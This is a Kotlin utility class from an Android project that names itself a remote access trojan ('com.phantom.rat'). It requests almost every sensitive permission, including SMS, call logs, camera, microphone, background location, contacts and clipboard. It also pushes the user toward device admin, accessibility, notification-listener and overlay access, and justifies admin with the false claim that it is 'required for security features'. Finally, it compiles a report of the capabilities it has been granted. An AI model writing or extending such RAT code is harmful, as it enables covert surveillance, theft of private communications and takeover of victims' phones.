package com.phantom.rat.utils

import android.Manifest
import android.app.Activity
import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.Settings
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject

class PermissionUtils(private val context: Context) {

    companion object {
        const val PERMISSION_REQUEST_CODE = 1001
        const val OVERLAY_PERMISSION_CODE = 1002
        const val WRITE_SETTINGS_CODE = 1003
        const val NOTIFICATION_LISTENER_CODE = 1004

        val ALL_PERMISSIONS = arrayOf(
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.WRITE_CALL_LOG,
            Manifest.permission.PROCESS_OUTGOING_CALLS,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.SYSTEM_ALERT_WINDOW,
            Manifest.permission.REQUEST_INSTALL_PACKAGES,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.KILL_BACKGROUND_PROCESSES,
            Manifest.permission.READ_LOGS,
            Manifest.permission.PACKAGE_USAGE_STATS,
            Manifest.permission.READ_CLIPBOARD,
            Manifest.permission.BATTERY_STATS
        )

        val Q_PERMISSIONS = arrayOf(
            Manifest.permission.MANAGE_EXTERNAL_STORAGE
        )
    }

    fun checkAndRequestAllPermissions(activity: Activity) {
        val missingPermissions = getMissingPermissions()
        
        if (missingPermissions.isNotEmpty()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (missingPermissions.contains(Manifest.permission.MANAGE_EXTERNAL_STORAGE)) {
                    requestManageStorage(activity)
                }
            }
            
            ActivityCompat.requestPermissions(
                activity,
                missingPermissions.toTypedArray(),
                PERMISSION_REQUEST_CODE
            )
        }
    }

    fun getMissingPermissions(): List<String> {
        val missing = mutableListOf<String>()
        
        ALL_PERMISSIONS.forEach { permission ->
            if (ContextCompat.checkSelfPermission(context, permission)
                != PackageManager.PERMISSION_GRANTED) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    missing.add(permission)
                }
            }
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                missing.add(Manifest.permission.MANAGE_EXTERNAL_STORAGE)
            }
        }
        
        return missing
    }

    fun hasAllPermissions(): Boolean {
        return getMissingPermissions().isEmpty()
    }

    fun getPermissionsStatus(): JSONObject {
        val result = JSONObject()
        val granted = JSONArray()
        val denied = JSONArray()
        
        ALL_PERMISSIONS.forEach { permission ->
            val status = ContextCompat.checkSelfPermission(context, permission)
            val entry = JSONObject().apply {
                put("permission", permission)
                put("name", permission.substringAfterLast("."))
                put("granted", status == PackageManager.PERMISSION_GRANTED)
            }
            
            if (status == PackageManager.PERMISSION_GRANTED) {
                granted.put(entry)
            } else {
                denied.put(entry)
            }
        }
        
        result.put("granted", granted)
        result.put("denied", denied)
        result.put("granted_count", granted.length())
        result.put("denied_count", denied.length())
        result.put("has_overlay", canDrawOverlays())
        result.put("has_usage_stats", hasUsageStatsPermission())
        result.put("has_manage_storage", if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
            Environment.isExternalStorageManager() else false)
        result.put("is_device_admin", isDeviceAdmin())
        result.put("has_notification_listener", isNotificationListenerEnabled())
        result.put("has_accessibility", isAccessibilityServiceEnabled())
        
        return result
    }

    fun canDrawOverlays(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(context)
        } else true
    }

    fun hasUsageStatsPermission(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return true
        val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
        val mode = appOps.checkOpNoThrow(
            android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(),
            context.packageName
        )
        return mode == android.app.AppOpsManager.MODE_ALLOWED
    }

    fun isDeviceAdmin(): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_ADMIN_SERVICE) as android.app.admin.DevicePolicyManager
        val component = android.content.ComponentName(context, 
            com.phantom.rat.core.AdminReceiver::class.java)
        return dpm.isAdminActive(component)
    }

    fun isNotificationListenerEnabled(): Boolean {
        val packageName = context.packageName
        val listeners = Settings.Secure.getString(
            context.contentResolver,
            "enabled_notification_listeners"
        ) ?: return false
        return listeners.contains(packageName)
    }

    fun isAccessibilityServiceEnabled(): Boolean {
        val service = "${context.packageName}/" +
            "${com.phantom.rat.services.PhantomAccessibilityService::class.java.canonicalName}"
        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabledServices.contains(service)
    }

    fun requestOverlayPermission(activity: Activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !canDrawOverlays()) {
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:${context.packageName}")
            )
            activity.startActivityForResult(intent, OVERLAY_PERMISSION_CODE)
        }
    }

    fun requestManageStorage(activity: Activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = Uri.parse("package:${context.packageName}")
                }
                activity.startActivityForResult(intent, PERMISSION_REQUEST_CODE)
            }
        }
    }

    fun requestDeviceAdmin(activity: Activity) {
        val dpm = context.getSystemService(Context.DEVICE_ADMIN_SERVICE) as android.app.admin.DevicePolicyManager
        val component = android.content.ComponentName(context, 
            com.phantom.rat.core.AdminReceiver::class.java)
        
        if (!dpm.isAdminActive(component)) {
            val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, component)
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "This permission is required for security features")
            }
            activity.startActivityForResult(intent, PERMISSION_REQUEST_CODE)
        }
    }

    fun requestAccessibilityService(activity: Activity) {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        activity.startActivityForResult(intent, PERMISSION_REQUEST_CODE)
    }

    fun requestNotificationListener(activity: Activity) {
        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
        activity.startActivityForResult(intent, NOTIFICATION_LISTENER_CODE)
    }

    fun showPermissionDialog(activity: Activity, title: String, message: String, 
                             permission: String, requestCode: Int) {
        AlertDialog.Builder(activity)
            .setTitle(title)
            .setMessage(message)
            .setPositiveButton("Grant") { _, _ ->
                ActivityCompat.requestPermissions(activity, arrayOf(permission), requestCode)
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    fun showSettingsDialog(activity: Activity, title: String, message: String,
                           settingsAction: String) {
        AlertDialog.Builder(activity)
            .setTitle(title)
            .setMessage(message)
            .setPositiveButton("Open Settings") { _, _ ->
                activity.startActivity(Intent(settingsAction))
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private object Environment {
        @JvmStatic
        fun isExternalStorageManager(): Boolean {
            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                android.os.Environment.isExternalStorageManager()
            } else true
        }
    }
}
